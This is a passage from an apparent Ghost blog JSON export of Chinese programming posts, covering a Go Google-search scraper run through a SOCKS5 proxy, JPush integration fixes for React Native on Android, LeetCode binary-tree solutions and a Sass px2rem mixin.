client.Do(req)\n\tif error != nil {\n\t\tfmt.Errorf(\"Get请求%s返回错误:%s\", url, error)\n\t\treturn\n\t}\n\tstatusCode = res.StatusCode\n\tif res.StatusCode == 200 {\n\t\tbody := res.Body\n\t\tdefer body.Close()\n\t\tbodyByte, _ := ioutil.ReadAll(body)\n\t\tcontent = string(bodyByte)\n\t} else {\n\t\tcontent = \"\"\n\t}\n\treturn\n}\n\nfunc run(ip,port,q,num string) {\n\tfmt.Println(`Start...`)\n\ts, _ := Get(\"https://www.google.com.hk/search?q=\"+q+\"&num=\"+num,ip,port,)\n\tvar f *os.File\n\tvar filename = \"./output.txt\"\n\t// if checkFileIsExist(filename) { //如果文件存在\n\t// \tf, _ = os.OpenFile(filename, os.O_APPEND, 0666) //打开文件\n\t// \tfmt.Println(\"文件存在\")\n\t// } else {\n\t// \tf, _ = os.Create(filename) //创建文件\n\t// \tfmt.Println(\"文件不存在\")\n\t// }\n\n\tstrArr := url.FindAllString(s, -1)\n\t//\tfmt.Printf(\"%q\\n\",strArr)\n\t// reg1 := regexp.MustCompile(`(?P<q>Hell|G)o`)\n\t// fmt.Printf(\"%q\\n\", reg1.ReplaceAllString(\"Hello 世界！123 Go\", \"${q}ooo\"))\n\tstr := \"\"\n\treg := regexp.MustCompile(`(<cite class=\"_Rm\">|</cite>)`)\n\tfor i := 0; i < len(strArr); i++ {\n\t//\tfmt.Printf(\"%q\\n\", reg.ReplaceAllString(strArr[i], \"${1}\"))\n\t\tstr += reg.ReplaceAllString(strArr[i], \"\") + \"\\r\\n\"\n\t}\n\t//str+=s\n\tf, _ = os.Create(filename)\n\tdefer f.Close()\n\tn, _ := f.WriteString(str) //写入文件(字符串)\n\tfmt.Printf(\"写入 %d 个字节n\", n)\n\tf.Sync()\n\t//\tfmt.Println(s)\n}\n\nfunc main() {\n app := cli.NewApp()\n var ip string\n var port string\n var num string\n\n  app.Flags = []cli.Flag {\n    cli.StringFlag{\n      Name: \"ip\",\n      Value: \"127.0.0.1\",\n      Usage: \"SOCKS5代理地址\",\n\t  Destination: &ip,\n    },cli.StringFlag{\n      Name: \"port,P\",\n      Value: \"3333\",\n      Usage: \"SOCKS5代理端口\",\n\t  Destination: &port,\n    },cli.StringFlag{\n      Name: \"num,N\",\n      Value: \"100\",\n      Usage: \"搜索条数\",\n\t  Destination: &num,\n    },\n  }\n\n  app.Action = func(c *cli.Context) error {\n    q := \"\"\n    if c.NArg() > 0 {\n      q = c.Args().Get(0)\n    }else{\n\t\t fmt.Println(\"请输入搜索关键字,如搜索1234 Get.exe 1234\\r\\nGet.exe -h,查看帮助\")\n\t\t return nil\n\t}\n\trun(ip,port,q,num)\n    return nil\n  }\n\n  app.Run(os.Args)\n}","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-03-09T10:08:00.000Z","created_by":"1","updated_at":"2017-03-09T10:08:48.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d31a","uuid":"ded78915-5afa-45da-87f5-f7cf0b2c1c9b","title":"React-Native 安卓下极光推送","slug":"react-native-an-zhuo-xia-ji-guang-tui-song","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 1.安装踩坑\\n\\n按照[官方教程](http://bbs.reactnative.cn/topic/3505/%E7%94%A8-jpush-react-native-%E6%8F%92%E4%BB%B6%E5%BF%AB%E9%80%9F%E9%9B%86%E6%88%90%E6%8E%A8%E9%80%81%E5%8A%9F%E8%83%BD-android-%E7%AF%87)来有一处坑。\\n\\n在修改app/src.../MainActivity.java中，教程漏了点东西。提示这个错误。\\n```\\n:app:compileDebugJavaWithJavac - is not incremental (e.g. outputs have changed, no pre\\nC:\\\\Users\\\\ldh\\\\WebstormProjects\\\\RN\\\\AwesomeProject\\\\android\\\\app\\\\src\\\\main\\\\java\\\\com\\\\myapp\\\\Ma\\n    protected void onCreate(Bundle savedInstanceState) {\\n                            ^\\n  符号:   类 Bundle\\n  位置: 类 MainActivity\\nC:\\\\Users\\\\ldh\\\\WebstormProjects\\\\RN\\\\AwesomeProject\\\\android\\\\app\\\\src\\\\main\\\\java\\\\com\\\\myapp\\\\Ma\\n        JPushInterface.init(this);\\n        ^\\n  符号:   变量 JPushInterface\\n  位置: 类 MainActivity\\nC:\\\\Users\\\\ldh\\\\WebstormProjects\\\\RN\\\\AwesomeProject\\\\android\\\\app\\\\src\\\\main\\\\java\\\\com\\\\myapp\\\\Ma\\n        JPushInterface.onPause(this);\\n        ^\\n  符号:   变量 JPushInterface\\n  位置: 类 MainActivity\\nC:\\\\Users\\\\ldh\\\\WebstormProjects\\\\RN\\\\AwesomeProject\\\\android\\\\app\\\\src\\\\main\\\\java\\\\com\\\\myapp\\\\Ma\\n        JPushInterface.onResume(this);\\n        ^\\n  符号:   变量 JPushInterface\\n  位置: 类 MainActivity\\n4 个错误\\n:app:compileDebugJavaWithJavac FAILED\\n```\\n明显是JPushInterface和Bundle未定义。只需加上这两句.即可\\n```\\nimport cn.jpush.android.api.JPushInterface;\\nimport android.os.Bundle;\\n```\\n> 使用jpush\\n```\\n        import JPushModule from 'jpush-react-native';\\n        JPushModule.addReceiveCustomMsgListener((message) => {\\n          //   console.warn(\\\"addReceiveCustomMsgListener\\\" +JSON.stringify(message));\\n          //  自定义消息\\n        });\\n        JPushModule.addReceiveNotificationListener((message) => {\\n          //  console.warn(\\\"receive notification: \\\" + JSON.stringify(message));\\n          //  通知消息\\n        })\\n         JPushModule.addReceiveOpenNotificationListener((map) => {\\n           // 点击通知后触发的事件\\n           //  console.warn(\\\"addReceiveOpenNotificationListener: \\\" + JSON.stringify(map));\\n                this.props.navigator.push({\\n                    name: 'page2'\\n                })\\n          })\\n其他\\nfunction RunPush(data) {\\n  AsyncStorage.getItem('userInfo').then((result) => {\\n    if (result != JSON.stringify(data.data)) {\\n      AsyncStorage.setItem('userInfo', JSON.stringify(data.data))\\n      JPushModule.setAlias(data.data.userName, () => { }, () => { }) //设置别名\\n      if( data.data.isDeveloper===1){\\n        JPushModule.setTags([\\\"developer\\\"], () => {}, () => { }); //设置标签\\n      }else{\\n        JPushModule.setTags([\\\"user\\\"], () => {}, () => { });\\n      }\\n      \\n    } else {\\n\\n    }\\n  })\\n}\\n\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>1.安装踩坑</p>\n</blockquote>\n<p>按照<a href=\"http://bbs.reactnative.cn/topic/3505/%E7%94%A8-jpush-react-native-%E6%8F%92%E4%BB%B6%E5%BF%AB%E9%80%9F%E9%9B%86%E6%88%90%E6%8E%A8%E9%80%81%E5%8A%9F%E8%83%BD-android-%E7%AF%87\">官方教程</a>来有一处坑。</p>\n<p>在修改app/src.../MainActivity.java中，教程漏了点东西。提示这个错误。</p>\n<pre><code>:app:compileDebugJavaWithJavac - is not incremental (e.g. outputs have changed, no pre\nC:\\Users\\ldh\\WebstormProjects\\RN\\AwesomeProject\\android\\app\\src\\main\\java\\com\\myapp\\Ma\n    protected void onCreate(Bundle savedInstanceState) {\n                            ^\n  符号:   类 Bundle\n  位置: 类 MainActivity\nC:\\Users\\ldh\\WebstormProjects\\RN\\AwesomeProject\\android\\app\\src\\main\\java\\com\\myapp\\Ma\n        JPushInterface.init(this);\n        ^\n  符号:   变量 JPushInterface\n  位置: 类 MainActivity\nC:\\Users\\ldh\\WebstormProjects\\RN\\AwesomeProject\\android\\app\\src\\main\\java\\com\\myapp\\Ma\n        JPushInterface.onPause(this);\n        ^\n  符号:   变量 JPushInterface\n  位置: 类 MainActivity\nC:\\Users\\ldh\\WebstormProjects\\RN\\AwesomeProject\\android\\app\\src\\main\\java\\com\\myapp\\Ma\n        JPushInterface.onResume(this);\n        ^\n  符号:   变量 JPushInterface\n  位置: 类 MainActivity\n4 个错误\n:app:compileDebugJavaWithJavac FAILED\n</code></pre>\n<p>明显是JPushInterface和Bundle未定义。只需加上这两句.即可</p>\n<pre><code>import cn.jpush.android.api.JPushInterface;\nimport android.os.Bundle;\n</code></pre>\n<blockquote>\n<p>使用jpush</p>\n</blockquote>\n<pre><code>        import JPushModule from 'jpush-react-native';\n        JPushModule.addReceiveCustomMsgListener((message) =&gt; {\n          //   console.warn(&quot;addReceiveCustomMsgListener&quot; +JSON.stringify(message));\n          //  自定义消息\n        });\n        JPushModule.addReceiveNotificationListener((message) =&gt; {\n          //  console.warn(&quot;receive notification: &quot; + JSON.stringify(message));\n          //  通知消息\n        })\n         JPushModule.addReceiveOpenNotificationListener((map) =&gt; {\n           // 点击通知后触发的事件\n           //  console.warn(&quot;addReceiveOpenNotificationListener: &quot; + JSON.stringify(map));\n                this.props.navigator.push({\n                    name: 'page2'\n                })\n          })\n其他\nfunction RunPush(data) {\n  AsyncStorage.getItem('userInfo').then((result) =&gt; {\n    if (result != JSON.stringify(data.data)) {\n      AsyncStorage.setItem('userInfo', JSON.stringify(data.data))\n      JPushModule.setAlias(data.data.userName, () =&gt; { }, () =&gt; { }) //设置别名\n      if( data.data.isDeveloper===1){\n        JPushModule.setTags([&quot;developer&quot;], () =&gt; {}, () =&gt; { }); //设置标签\n      }else{\n        JPushModule.setTags([&quot;user&quot;], () =&gt; {}, () =&gt; { });\n      }\n      \n    } else {\n\n    }\n  })\n}\n\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"94","plaintext":"> 1.安装踩坑\n\n\n按照官方教程\n[http://bbs.reactnative.cn/topic/3505/%E7%94%A8-jpush-react-native-%E6%8F%92%E4%BB%B6%E5%BF%AB%E9%80%9F%E9%9B%86%E6%88%90%E6%8E%A8%E9%80%81%E5%8A%9F%E8%83%BD-android-%E7%AF%87]\n来有一处坑。\n\n在修改app/src.../MainActivity.java中，教程漏了点东西。提示这个错误。\n\n:app:compileDebugJavaWithJavac - is not incremental (e.g. outputs have changed, no pre\nC:\\Users\\ldh\\WebstormProjects\\RN\\AwesomeProject\\android\\app\\src\\main\\java\\com\\myapp\\Ma\n    protected void onCreate(Bundle savedInstanceState) {\n                            ^\n  符号:   类 Bundle\n  位置: 类 MainActivity\nC:\\Users\\ldh\\WebstormProjects\\RN\\AwesomeProject\\android\\app\\src\\main\\java\\com\\myapp\\Ma\n        JPushInterface.init(this);\n        ^\n  符号:   变量 JPushInterface\n  位置: 类 MainActivity\nC:\\Users\\ldh\\WebstormProjects\\RN\\AwesomeProject\\android\\app\\src\\main\\java\\com\\myapp\\Ma\n        JPushInterface.onPause(this);\n        ^\n  符号:   变量 JPushInterface\n  位置: 类 MainActivity\nC:\\Users\\ldh\\WebstormProjects\\RN\\AwesomeProject\\android\\app\\src\\main\\java\\com\\myapp\\Ma\n        JPushInterface.onResume(this);\n        ^\n  符号:   变量 JPushInterface\n  位置: 类 MainActivity\n4 个错误\n:app:compileDebugJavaWithJavac FAILED\n\n\n明显是JPushInterface和Bundle未定义。只需加上这两句.即可\n\nimport cn.jpush.android.api.JPushInterface;\nimport android.os.Bundle;\n\n\n> 使用jpush\n\n\n        import JPushModule from 'jpush-react-native';\n        JPushModule.addReceiveCustomMsgListener((message) => {\n          //   console.warn(\"addReceiveCustomMsgListener\" +JSON.stringify(message));\n          //  自定义消息\n        });\n        JPushModule.addReceiveNotificationListener((message) => {\n          //  console.warn(\"receive notification: \" + JSON.stringify(message));\n          //  通知消息\n        })\n         JPushModule.addReceiveOpenNotificationListener((map) => {\n           // 点击通知后触发的事件\n           //  console.warn(\"addReceiveOpenNotificationListener: \" + JSON.stringify(map));\n                this.props.navigator.push({\n                    name: 'page2'\n                })\n          })\n其他\nfunction RunPush(data) {\n  AsyncStorage.getItem('userInfo').then((result) => {\n    if (result != JSON.stringify(data.data)) {\n      AsyncStorage.setItem('userInfo', JSON.stringify(data.data))\n      JPushModule.setAlias(data.data.userName, () => { }, () => { }) //设置别名\n      if( data.data.isDeveloper===1){\n        JPushModule.setTags([\"developer\"], () => {}, () => { }); //设置标签\n      }else{\n        JPushModule.setTags([\"user\"], () => {}, () => { });\n      }\n      \n    } else {\n\n    }\n  })\n}","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-03-10T10:00:25.000Z","created_by":"1","updated_at":"2017-03-10T10:11:41.000Z","updated_by":"1","published_at":"2017-03-10T10:11:41.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d31b","uuid":"d4fe18a8-51a3-4bc6-8311-1529e3e86817","title":"极光推送-点击推送通知唤醒应用android","slug":"ji-guang-tui-song-dian-ji-tui-song-tong-zhi-huan-xing-ying-yong","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"jpush:1.5.2\\nreact-native:0.4.2\\n是因为应用挂在后台后，mModule变成了null。\\n<pre class=\\\"brush:js;\\\" >\\nif (mModule != null && mModule.mContext != null) {\\n    Intent intent = new Intent();\\n    intent.setClass(context, mModule.mContext.getClass());\\n    intent.putExtras(bundle);\\n    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);\\n    context.startActivity(intent);                    \\n} else {\\n    Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage(mRAC.getPackageName());//mRAC.getPackageName()==你的应用包名\\n   launchIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);                    \\n   launchIntent.putExtras(bundle);\\n   context.startActivity(launchIntent);                    \\n}\\n</pre>\\n\\n上面的代码在收到通知，点击通知后， 就会创建1个activity，可能导致要多退出一次才能退出成功。\\n修改AndroidManifest.xml,添加android:launchMode=\\\"singleTask\\\"。\\n```\\n   <activity\\n        android:name=\\\".MainActivity\\\"\\n        android:label=\\\"@string/app_name\\\"\\n        android:launchMode=\\\"singleTask\\\"  \\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>jpush:1.5.2<br>\nreact-native:0.4.2<br>\n是因为应用挂在后台后，mModule变成了null。</p>\n<pre class=\"brush:js;\" >\nif (mModule != null && mModule.mContext != null) {\n    Intent intent = new Intent();\n    intent.setClass(context, mModule.mContext.getClass());\n    intent.putExtras(bundle);\n    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);\n    context.startActivity(intent);                    \n} else {\n    Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage(mRAC.getPackageName());//mRAC.getPackageName()==你的应用包名\n   launchIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);                    \n   launchIntent.putExtras(bundle);\n   context.startActivity(launchIntent);                    \n}\n</pre>\n<p>上面的代码在收到通知，点击通知后， 就会创建1个activity，可能导致要多退出一次才能退出成功。<br>\n修改AndroidManifest.xml,添加android:launchMode=&quot;singleTask&quot;。</p>\n<pre><code>   &lt;activity\n        android:name=&quot;.MainActivity&quot;\n        android:label=&quot;@string/app_name&quot;\n        android:launchMode=&quot;singleTask&quot;  \n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"95","plaintext":"jpush:1.5.2\nreact-native:0.4.2\n是因为应用挂在后台后，mModule变成了null。\n\n\nif (mModule != null && mModule.mContext != null) {\n    Intent intent = new Intent();\n    intent.setClass(context, mModule.mContext.getClass());\n    intent.putExtras(bundle);\n    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);\n    context.startActivity(intent);                    \n} else {\n    Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage(mRAC.getPackageName());//mRAC.getPackageName()==你的应用包名\n   launchIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);                    \n   launchIntent.putExtras(bundle);\n   context.startActivity(launchIntent);                    \n}\n\n\n上面的代码在收到通知，点击通知后， 就会创建1个activity，可能导致要多退出一次才能退出成功。\n修改AndroidManifest.xml,添加android:launchMode=\"singleTask\"。\n\n   <activity\n        android:name=\".MainActivity\"\n        android:label=\"@string/app_name\"\n        android:launchMode=\"singleTask\"","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-03-11T09:15:16.000Z","created_by":"1","updated_at":"2017-03-11T10:03:43.000Z","updated_by":"1","published_at":"2017-03-11T09:22:12.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d31c","uuid":"1b30c632-309e-4595-b250-621f5a97aa90","title":"Unique Binary Search Trees II--leetcode","slug":"unique-binary-search-trees-ii-leetcode-2","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"```\\n/**\\n * Definition for a binary tree node.\\n * type TreeNode struct {\\n *     Val int\\n *     Left *TreeNode\\n *     Right *TreeNode\\n * }\\n */\\nvar m=make(map[string][]*TreeNode)\\nfunc createTree(start,end int)[]*TreeNode {\\n    elem,ok:=m[string(start)+string(end)]\\n    if(ok){\\n        return elem\\n    }\\n\\tres:=[]*TreeNode{}\\n\\tif start>end {  \\n        res=append(res,nil)\\n        return res;\\n    }  \\n\\tfor i:=start;i<=end;i++{\\n\\t\\t lefts:=createTree(start,i-1)\\n\\t\\t rights:=createTree(i+1,end)\\n\\t\\t for j:=0;j<len(lefts);j++{\\n\\t\\t\\t for k:=0;k<len(rights);k++{\\n\\t\\t\\t\\t var temp=TreeNode{i,nil,nil}\\n\\t\\t\\t\\t temp.Left=lefts[j]\\n\\t\\t\\t\\t temp.Right=rights[k]\\n\\t\\t\\t\\t res=append(res,&temp)\\n\\t\\t\\t }\\n\\t\\t }\\n\\t} \\n\\tm[string(start)+string(end)]=res\\n\\treturn res\\n}\\n\\nfunc generateTrees(n int) []*TreeNode {\\n    if(n<=0){\\n        res:=[]*TreeNode{}\\n        return res\\n    }else{\\n        return createTree(1,n)\\n    }\\n    \\n}\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>/**\n * Definition for a binary tree node.\n * type TreeNode struct {\n *     Val int\n *     Left *TreeNode\n *     Right *TreeNode\n * }\n */\nvar m=make(map[string][]*TreeNode)\nfunc createTree(start,end int)[]*TreeNode {\n    elem,ok:=m[string(start)+string(end)]\n    if(ok){\n        return elem\n    }\n\tres:=[]*TreeNode{}\n\tif start&gt;end {  \n        res=append(res,nil)\n        return res;\n    }  \n\tfor i:=start;i&lt;=end;i++{\n\t\t lefts:=createTree(start,i-1)\n\t\t rights:=createTree(i+1,end)\n\t\t for j:=0;j&lt;len(lefts);j++{\n\t\t\t for k:=0;k&lt;len(rights);k++{\n\t\t\t\t var temp=TreeNode{i,nil,nil}\n\t\t\t\t temp.Left=lefts[j]\n\t\t\t\t temp.Right=rights[k]\n\t\t\t\t res=append(res,&amp;temp)\n\t\t\t }\n\t\t }\n\t} \n\tm[string(start)+string(end)]=res\n\treturn res\n}\n\nfunc generateTrees(n int) []*TreeNode {\n    if(n&lt;=0){\n        res:=[]*TreeNode{}\n        return res\n    }else{\n        return createTree(1,n)\n    }\n    \n}\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"96","plaintext":"/**\n * Definition for a binary tree node.\n * type TreeNode struct {\n *     Val int\n *     Left *TreeNode\n *     Right *TreeNode\n * }\n */\nvar m=make(map[string][]*TreeNode)\nfunc createTree(start,end int)[]*TreeNode {\n    elem,ok:=m[string(start)+string(end)]\n    if(ok){\n        return elem\n    }\n\tres:=[]*TreeNode{}\n\tif start>end {  \n        res=append(res,nil)\n        return res;\n    }  \n\tfor i:=start;i<=end;i++{\n\t\t lefts:=createTree(start,i-1)\n\t\t rights:=createTree(i+1,end)\n\t\t for j:=0;j<len(lefts);j++{\n\t\t\t for k:=0;k<len(rights);k++{\n\t\t\t\t var temp=TreeNode{i,nil,nil}\n\t\t\t\t temp.Left=lefts[j]\n\t\t\t\t temp.Right=rights[k]\n\t\t\t\t res=append(res,&temp)\n\t\t\t }\n\t\t }\n\t} \n\tm[string(start)+string(end)]=res\n\treturn res\n}\n\nfunc generateTrees(n int) []*TreeNode {\n    if(n<=0){\n        res:=[]*TreeNode{}\n        return res\n    }else{\n        return createTree(1,n)\n    }\n    \n}","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-03-13T08:49:57.000Z","created_by":"1","updated_at":"2017-03-13T10:07:30.000Z","updated_by":"1","published_at":"2017-03-13T08:58:47.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d31d","uuid":"b0514c9c-8db7-491f-8a25-51472bed0c62","title":"Invert Binary Tree--leetcode","slug":"invert-binary-tree-leetcode","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"简单递归\\n```\\nfunc invertTree(root *TreeNode) *TreeNode {\\n\\tif(root==nil){return nil}\\n    temp:=TreeNode{}\\n    temp.Val=root.Val\\n\\ttemp.Left=invertTree(root.Right)\\n\\ttemp.Right=invertTree(root.Left)\\n\\treturn &temp\\n}\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>简单递归</p>\n<pre><code>func invertTree(root *TreeNode) *TreeNode {\n\tif(root==nil){return nil}\n    temp:=TreeNode{}\n    temp.Val=root.Val\n\ttemp.Left=invertTree(root.Right)\n\ttemp.Right=invertTree(root.Left)\n\treturn &amp;temp\n}\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"97","plaintext":"简单递归\n\nfunc invertTree(root *TreeNode) *TreeNode {\n\tif(root==nil){return nil}\n    temp:=TreeNode{}\n    temp.Val=root.Val\n\ttemp.Left=invertTree(root.Right)\n\ttemp.Right=invertTree(root.Left)\n\treturn &temp\n}","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-03-14T02:18:09.000Z","created_by":"1","updated_at":"2017-03-14T02:20:41.000Z","updated_by":"1","published_at":"2017-03-14T02:20:41.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d31e","uuid":"81393ba8-5501-45d5-84db-4bf9e67f0129","title":"Recover Binary Search Tree--leetcode","slug":"recover-binary-search-tree-leetcode","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"中序遍历二叉搜索树，是一串从小到大的数字，这里的树，两个个数字交换了位置。只需找出错误的节点，交换回来即可。\\n```\\nvar err1 *TreeNode\\nvar err2 *TreeNode\\nvar pre *TreeNode\\nfunc run(root *TreeNode) {\\n\\tif root == nil {\\n\\t\\treturn\\n\\t}\\n\\n\\trun(root.Left)\\n\\tif(pre!=nil&&pre.Val>root.Val){\\n\\t\\tif(err1==nil){\\n\\t\\t\\terr1=pre\\n\\t\\t\\terr2=root\\n\\t\\t}else {\\n\\t\\t\\terr2=root\\n\\t\\t}\\n\\t}\\n\\tpre=root\\n\\trun(root.Right)\\n}\\n\\nfunc recoverTree(root *TreeNode) {\\n    pre=nil\\n\\terr1=nil\\n\\terr2=nil\\n\\trun(root)\\n    \\n\\ttemp:=err1.Val;\\n\\terr1.Val=err2.Val\\n\\terr2.Val=temp\\n\\n}\\n```\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>中序遍历二叉搜索树，是一串从小到大的数字，这里的树，两个个数字交换了位置。只需找出错误的节点，交换回来即可。</p>\n<pre><code>var err1 *TreeNode\nvar err2 *TreeNode\nvar pre *TreeNode\nfunc run(root *TreeNode) {\n\tif root == nil {\n\t\treturn\n\t}\n\n\trun(root.Left)\n\tif(pre!=nil&amp;&amp;pre.Val&gt;root.Val){\n\t\tif(err1==nil){\n\t\t\terr1=pre\n\t\t\terr2=root\n\t\t}else {\n\t\t\terr2=root\n\t\t}\n\t}\n\tpre=root\n\trun(root.Right)\n}\n\nfunc recoverTree(root *TreeNode) {\n    pre=nil\n\terr1=nil\n\terr2=nil\n\trun(root)\n    \n\ttemp:=err1.Val;\n\terr1.Val=err2.Val\n\terr2.Val=temp\n\n}\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"98","plaintext":"中序遍历二叉搜索树，是一串从小到大的数字，这里的树，两个个数字交换了位置。只需找出错误的节点，交换回来即可。\n\nvar err1 *TreeNode\nvar err2 *TreeNode\nvar pre *TreeNode\nfunc run(root *TreeNode) {\n\tif root == nil {\n\t\treturn\n\t}\n\n\trun(root.Left)\n\tif(pre!=nil&&pre.Val>root.Val){\n\t\tif(err1==nil){\n\t\t\terr1=pre\n\t\t\terr2=root\n\t\t}else {\n\t\t\terr2=root\n\t\t}\n\t}\n\tpre=root\n\trun(root.Right)\n}\n\nfunc recoverTree(root *TreeNode) {\n    pre=nil\n\terr1=nil\n\terr2=nil\n\trun(root)\n    \n\ttemp:=err1.Val;\n\terr1.Val=err2.Val\n\terr2.Val=temp\n\n}","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-03-16T07:47:02.000Z","created_by":"1","updated_at":"2017-03-26T05:13:04.000Z","updated_by":"1","published_at":"2016-12-07T07:05:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d31f","uuid":"4252d0cf-7f40-4be0-9456-9a4a9bdf2e59","title":"px2rem-vc code插件推荐","slug":"px2rem-vc-codecha-jian-tui-jian","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> px2rem\\n\\nSass(使用Sass的函数、混合宏这些功能来实现):\\n```\\n$root-font-size:100px;\\n\\n@mixin px2rem($property,$px-values,$baseline-px:$root-font-size,$support-for-ie:false){\\n  $baseline-rem: $baseline-px / 1rem * 1;\\n  @if $support-for-ie {\\n    #{$property}: $px-values;\\n  }\\n  @if type-of($px-values) == \\\"number\\\"{\\n    #{$property}: $px-values / $baseline-rem;\\n  }\\n  @else {\\n    $rem-values:();\\n    @each $value in $px-values{\\n\\n      @if $value == 0 or type-of($value) == \\\"number\\\"{\\n        $rem-values: append($rem-values, $value / $baseline-rem);\\n      }\\n    }\\n    #{$property}: $rem-values;\\n  }\\n}\\n//funtion写法\\n@function Px2rem($px-values,$baseline-px:$root-font-size){\\n    $baseline-rem: $baseline-px / 1rem * 1;\\n    @if type-of($px-values) == \\\"number\\\"{\\n        @return  $px-values / $baseline-rem;\\n    }\\n    @else {\\n        $rem-values:();\\n        @each $value in $px-values{\\n            @if $value == 0 or type-of($value) == \\\"number\\\"{\\n                $rem-values: append($rem-values, $value / $baseline-rem);\\n            }\\n        }\\n        @return  $rem-values;\\n    }\\n}\\n```\\n\\n\\n> px2rem-0.2.0.vsix\\n\\n这一个vs code下的[px2rem插件](https://github.com/Maroon1/px2rem)。\\n![](/content/images/2017/03/QQ--20170317171649.png)\\n\\n\\n\\n> scss去单位\\n```\\n @function strip-units($number){\\n    @return $number / ($number * 0 + 1);\\n}\\n```\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>px2rem</p>\n</blockquote>\n<p>Sass(使用Sass的函数、混合宏这些功能来实现):</p>\n<pre><code>$root-font-size:100px;\n\n@mixin px2rem($property,$px-values,$baseline-px:$root-font-size,$support-for-ie:false){\n  $baseline-rem: $baseline-px / 1rem * 1;\n  @if $support-for-ie {\n    #{$property}: $px-values;\n  }\n  @if type-of($px-values) == &quot;number&quot;{\n    #{$property}: $px-values / $baseline-rem;\n  }\n  @else {\n    $rem-values:();\n    @each $value in $px-values{\n\n      @if $value == 0 or type-of($value) == &quot;number&quot;{\n        $rem-values: append($rem-values, $value / $baseline-rem);\n      }\n    }\n    #{$property}: $rem-values;\n  }\n}\n//funtion写法\n@function Px2rem($px-values,$baseline-px:$root-font-size){\n    $baseline-rem: $baseline-px / 1rem * 1;\n    @if type-of($px-values) == &quot;number&quot;{\n        @return  $px-values / $baseline-rem;\n    }\n    @else {\n        $rem-values:();\n        @each $value in $px-values{\n            @if $value == 0 or type-of($value) == &quot;number&quot;{\n                $rem-values: append($rem-values, $value / $baseline-rem);\n            }\n        }\n        @return  $rem-values;\n    }\n}\n</code></pre>\n<blockquote>\n<p>px2rem-0.2.0.vsix</p>\n</blockquote>\n<p>这一个vs code下的<a href=\"https://github.com/Maroon1/px2rem\">px2rem插件</a>。<br>\n<img src=\"/content/images/2017/03/QQ--20170317171649.png\" alt=\"\"></p>\n<blockquote>\n<p>scss去单位</p>\n</blockquote>\n<pre><code> @function strip-units($number){\n    @return $number / ($number * 0 + 1);\n}\n</code></pre>\n<!--kg-card-end: 